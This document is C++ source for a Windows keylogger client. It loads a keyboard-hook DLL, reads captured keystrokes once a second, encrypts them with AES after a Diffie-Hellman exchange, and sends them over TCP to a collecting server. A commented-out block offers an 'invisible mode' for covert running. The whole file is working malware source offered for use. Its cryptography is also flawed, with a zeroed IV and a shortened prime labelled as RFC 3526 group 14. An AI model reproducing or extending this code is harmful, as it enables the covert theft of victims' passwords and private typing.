#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include <iostream>
#include <thread>
#include <chrono>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/dh.h>
#include <openssl/bn.h>
#include <openssl/sha.h>
#include <cstring>
#include <vector>

bool diffie_hellman_key_exchange(SOCKET sock, unsigned char aes_key[16]);

// Encrypts plaintext to ciphertext using AES-128-CBC with session key
int aes_encrypt(const unsigned char* plaintext, int plaintext_len, unsigned char* ciphertext, const unsigned char* key, const unsigned char* iv) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    int len, ciphertext_len;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

#pragma comment(lib, "ws2_32.lib")

typedef bool (__cdecl *StartKeyHookFunc)();
typedef void (__cdecl *StopKeyHookFunc)();
typedef const char* (__cdecl *GetKeyBufferFunc)();

HMODULE hDll = NULL;
StartKeyHookFunc StartKeyHook = nullptr;
StopKeyHookFunc StopKeyHook = nullptr;
GetKeyBufferFunc GetKeyBuffer = nullptr;

bool running = true;

SOCKET ConnectToServer(const char* ip, int port) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return INVALID_SOCKET;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "socket() failed\n";
        WSACleanup();
        return INVALID_SOCKET;
    }

    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "connect() failed\n";
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

void KeyloggerLoop() {
    SOCKET sock = ConnectToServer("127.0.0.1", 5000);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to connect to server\n";
        return;
    }

    unsigned char session_key[16];
    unsigned char session_iv[16] = {0}; // You can negotiate IV via DH or send it, here just zeroed for simplicity

    if (!diffie_hellman_key_exchange(sock, session_key)) {
        std::cerr << "DH key exchange failed\n";
        closesocket(sock);
        WSACleanup();
        return;
    }

    while (running) {
        const char* keys = GetKeyBuffer();
        if (keys && *keys != '\0') {
            int len = (int)strlen(keys);
            unsigned char ciphertext[2048];
            int ciphertext_len = aes_encrypt((const unsigned char*)keys, len, ciphertext, session_key, session_iv);
            int sent = send(sock, (const char*)ciphertext, ciphertext_len, 0);
            if (sent == SOCKET_ERROR) {
                std::cerr << "send() failed\n";
                break;
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    closesocket(sock);
    WSACleanup();
}

LRESULT CALLBACK DummyWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CLOSE) {
        running = false;
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

bool diffie_hellman_key_exchange(SOCKET sock, unsigned char aes_key[16]) {
    // 2048-bit MODP Group (RFC 3526 group 14)
    static const char* p_hex = "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
        "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
        "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
        "E485B576625E7EC6F44C42E9A63A3620FFFFFFFFFFFFFFFF";
    static const char* g_hex = "02";

    DH* dh = DH_new();
    BIGNUM* p = NULL;
    BIGNUM* g = NULL;
    BN_hex2bn(&p, p_hex);
    BN_hex2bn(&g, g_hex);
    DH_set0_pqg(dh, p, NULL, g);

    if (DH_generate_key(dh) != 1) {
        DH_free(dh);
        return false;
    }

    // Send public key to server
    const BIGNUM* pub_key = nullptr;
    DH_get0_key(dh, &pub_key, nullptr);
    int pub_len = BN_num_bytes(pub_key);
    std::vector<unsigned char> pub_buf(pub_len);
    BN_bn2bin(pub_key, pub_buf.data());
    uint16_t pub_len_net = htons(pub_len);
    send(sock, (char*)&pub_len_net, 2, 0);
    send(sock, (char*)pub_buf.data(), pub_len, 0);

    // Receive server's public key
    uint16_t srv_pub_len_net = 0;
    recv(sock, (char*)&srv_pub_len_net, 2, MSG_WAITALL);
    int srv_pub_len = ntohs(srv_pub_len_net);
    std::vector<unsigned char> srv_pub_buf(srv_pub_len);
    recv(sock, (char*)srv_pub_buf.data(), srv_pub_len, MSG_WAITALL);

    BIGNUM* srv_pub_bn = BN_bin2bn(srv_pub_buf.data(), srv_pub_len, NULL);

    // Compute shared secret
    unsigned char secret[256];
    int secret_len = DH_compute_key(secret, srv_pub_bn, dh);

    // Hash the shared secret to get a 16-byte AES key
    SHA256(secret, secret_len, secret);
    memcpy(aes_key, secret, 16);

    BN_free(srv_pub_bn);
    DH_free(dh);
    return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    // Carica la DLL
    hDll = LoadLibraryA("keyhook.dll");
    if (!hDll) {
        MessageBoxA(NULL, "Failed to load keyhook.dll", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    StartKeyHook = (StartKeyHookFunc)GetProcAddress(hDll, "StartKeyHook");
    StopKeyHook = (StopKeyHookFunc)GetProcAddress(hDll, "StopKeyHook");
    GetKeyBuffer = (GetKeyBufferFunc)GetProcAddress(hDll, "GetKeyBuffer");

    if (!StartKeyHook || !StopKeyHook || !GetKeyBuffer) {
        MessageBoxA(NULL, "Failed to get DLL functions", "Error", MB_OK | MB_ICONERROR);
        FreeLibrary(hDll);
        return 1;
    }

    if (!StartKeyHook()) {
        MessageBoxA(NULL, "Failed to start key hook", "Error", MB_OK | MB_ICONERROR);
        FreeLibrary(hDll);
        return 1;
    }

    // --- VISIBLE MODE (for testing) ---
    {
        WNDCLASSA wc = {0};
        wc.lpfnWndProc = DummyWndProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = "KeyloggerInvisibleWindow";
        RegisterClassA(&wc);

        HWND hwnd = CreateWindowA(wc.lpszClassName, "Keylogger", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

        std::thread senderThread(KeyloggerLoop);

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        running = false;
        senderThread.join();
    }
    // --- VISIBLE MODE END ---

    /*
    // --- INVISIBLE MODE (uncomment this block and comment the above for invisible mode) ---
    std::thread senderThread(KeyloggerLoop);
    MSG msg;
    while (running && GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    running = false;
    senderThread.join();
    // --- INVISIBLE MODE END ---
    */

    StopKeyHook();
    FreeLibrary(hDll);

    return 0;
}
